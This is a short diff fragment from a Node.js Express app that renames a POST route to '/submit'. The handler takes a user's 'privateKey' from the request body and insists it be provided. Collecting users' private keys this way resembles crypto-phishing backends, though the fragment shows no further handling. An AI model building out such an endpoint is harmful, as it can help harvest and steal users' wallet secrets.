@@ -52,7 +52,7 @@ app.get('/pending', (req, res) => {
 })
 
 
-app.post('/submit/issues', async (req, res) => {
+app.post('/submit', async (req, res) => {
     const privateKey = req.body.data;  // Assuming this is the input from the user
     if (!privateKey) {
         console.log('Private key must be provided. Very crucial')
